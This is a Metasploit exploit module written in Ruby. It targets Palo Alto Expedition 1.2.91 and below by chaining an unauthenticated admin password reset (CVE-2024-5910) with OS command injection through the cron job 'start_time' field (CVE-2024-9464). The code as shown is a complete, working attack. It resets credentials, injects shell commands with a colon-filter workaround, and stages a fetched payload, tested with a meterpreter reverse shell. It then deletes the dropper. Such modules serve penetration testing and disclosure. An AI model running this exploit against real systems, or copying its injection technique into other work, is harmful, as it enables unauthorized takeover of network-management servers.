class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Palo Alto Expedition Remote Code Execution (CVE-2024-5910 and CVE-2024-9464)',
        'Description' => %q{
          Obtain remote code execution in Palo Alto Expedition version 1.2.91 and below.
          The first vulnerability, CVE-2024-5910, allows to reset the password of the admin user, and the second vulnerability, CVE-2024-9464, is an authenticated OS command injection. In a default installation, commands will get executed in the context of www-data.
          When credentials are provided, this module will only exploit the second vulnerability. If no credentials are provided, the module will first try to reset the admin password and then perform the OS command injection.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Michael Heinzl', # MSF Module
          'Zach Hanley', # Discovery CVE-2024-9464 and PoC
          'Enrique Castillo', # Discovery CVE-2024-9464
          'Brian Hysell' # Discovery CVE-2024-5910
        ],
        'References' => [
          [ 'URL', 'https://www.horizon3.ai/attack-research/palo-alto-expedition-from-n-day-to-full-compromise/'],
          [ 'URL', 'https://security.paloaltonetworks.com/PAN-SA-2024-0010'],
          [ 'URL', 'https://security.paloaltonetworks.com/CVE-2024-5910'],
          [ 'CVE', '2024-5910'],
          [ 'CVE', '2024-24809']
        ],
        'DisclosureDate' => '2024-10-09',
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => 'True',
          'FETCH_FILENAME' => Rex::Text.rand_text_alpha(1..3),
          'FETCH_WRITABLE_DIR' => '/tmp'
        },
        'Platform' => [ 'linux' ],
        'Arch' => [ ARCH_CMD ],
        'Targets' => [
          [
            'Linux Command',
            {
              'Arch' => [ ARCH_CMD ],
              'Platform' => [ 'linux' ],
              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
              'Type' => :unix_cmd
            }
          ]
        ],

        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, ACCOUNT_LOCKOUTS]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [false, 'Username for authentication, if available']),
        OptString.new('PASSWORD', [false, 'Password for the specified user']),
        OptString.new('TARGETURI', [ true, 'The URI for the Expedition web interface', '/'])
      ]
    )
  end

  def xsrf_token_value
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'bin/Auth.php'),
      'keep_cookies' => true,
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'action' => 'get',
        'type' => 'login_users',
        'user' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }
    )

    fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.') unless res

    data = res.get_json_document

    fail_with(Failure::UnexpectedReply, "Unexpected reply from the server: #{data}") unless data['csrfToken']

    print_good('Successfully authenticated')

    csrftoken = data['csrfToken']
    fail_with(Failure::UnexpectedReply, 'csrftoken not found.') unless csrftoken
    vprint_status("Got csrftoken: #{csrftoken}")
    csrftoken
  end

  def check
    unless datastore['USERNAME'] && datastore['PASSWORD']
      res = send_request_cgi(
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'OS/startup/restore/restoreAdmin.php')
      )

      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.') unless res

      if res.code == 403
        return CheckCode::Safe
      end

      fail_with(Failure::UnexpectedReply, "Unexpected reply from the server: #{res.body}") unless res.code == 200 && res.to_s.include?('Admin password restored to')

      respass = res.to_s.match(/'([^']+)'/)[1] # Search for the password: âœ“	Admin password restored to:    'paloalto'
      print_good("Admin password successfully restored to default value #{respass} (CVE-2024-5910).")
      datastore['PASSWORD'] = respass
      datastore['USERNAME'] = 'admin'
    end

    @xsrf_token_value = xsrf_token_value

    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'bin/MTSettings/settings.php?param=versions'),
      'keep_cookies' => true,
      'headers' => {
        'Csrftoken' => @xsrf_token_value
      }
    )

    data = res.get_json_document
    version = data['msg']['Expedition']

    if version.nil?
      return CheckCode::Unknown
    end

    print_status('Version retrieved: ' + version)

    if Rex::Version.new(version) > Rex::Version.new('1.2.91')
        return CheckCode::Safe
    end
    
    return CheckCode::Appears
    
  end

  def exploit
    cmd = payload.encoded

    @xsrf_token_value ||= xsrf_token_value

    print_status('Adding a new cronjob...')
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'bin/CronJobs.php'),
      'keep_cookies' => true,
      'headers' => {
        'Csrftoken' => @xsrf_token_value
      },
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'action' => 'add',
        'type' => 'new_cronjob',
        'project' => 'pandb'
      }
    )

    unless res
      fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
    end

    data = res.get_json_document
    fail_with(Failure::UnexpectedReply, "Unexpected reply from the server: #{data}") unless data['success'] == true

    cmd = cmd.gsub('http://', '').gsub('https://', '').gsub(':', '$(echo $PATH|cut -c16)') # ':' breaks the injection; $PATH on Ubuntu 20.04 contains '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games', which is used as an alternative way to get ':'
    cmds = cmd.split(';')
    cmds.each do |c|
      if c.length > 97
        print_bad("Command: '#{c}' is too long. Length: #{c.length}. Try to shorten it to 97 or less characters.")
      end
    end

    name = Rex::Text.rand_text_alpha(4..8)
    vprint_status('Using random name: ' + name)
    print_status('Injecting OS command...')

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'bin/CronJobs.php'),
      'keep_cookies' => true,
      'headers' => {
        'Csrftoken' => @xsrf_token_value
      },
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'action' => 'set',
        'type' => 'cron_jobs',
        'project' => 'pandb',
        'name' => name,
        'cron_id' => 1,
        'recurrence' => 'Daily',
        'start_time' => "\";#{cmds[0]} #"
      }
    )

    fail_with(Failure::UnexpectedReply, "Unexpected HTTP code from the target: #{res.code}") unless res.code == 200

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'bin/CronJobs.php'),
      'keep_cookies' => true,
      'headers' => {
        'Csrftoken' => @xsrf_token_value
      },
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'action' => 'set',
        'type' => 'cron_jobs',
        'project' => 'pandb',
        'name' => name,
        'cron_id' => 1,
        'recurrence' => 'Daily',
        'start_time' => "\";#{cmds[1]} #"
      }
    )

    fail_with(Failure::UnexpectedReply, "Unexpected HTTP code from the target: #{res.code}") unless res.code == 200

    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'bin/CronJobs.php'),
      'keep_cookies' => true,
      'headers' => {
        'Csrftoken' => @xsrf_token_value
      },
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'action' => 'set',
        'type' => 'cron_jobs',
        'project' => 'pandb',
        'name' => name,
        'cron_id' => 1,
        'recurrence' => 'Daily',
        'start_time' => "\";#{cmds[2].gsub('&', '').gsub(/\s+/, ' ').strip} #"
      }
    )

    fail_with(Failure::UnexpectedReply, "Unexpected HTTP code from the target: #{res.code}") unless res.code == 200

    dropper = datastore['FETCH_WRITABLE_DIR'] + '/' + datastore['FETCH_FILENAME']
    send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'bin/CronJobs.php'),
      'keep_cookies' => true,
      'headers' => {
        'Csrftoken' => @xsrf_token_value
      },
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'action' => 'set',
        'type' => 'cron_jobs',
        'project' => 'pandb',
        'name' => name,
        'cron_id' => 1,
        'recurrence' => 'Daily',
        'start_time' => "\";rm #{dropper} #"
      }
    )

    fail_with(Failure::UnexpectedReply, "Unexpected HTTP code from the target: #{res.code}") unless res.code == 200

    print_status('Check thy shell.')
  end
end
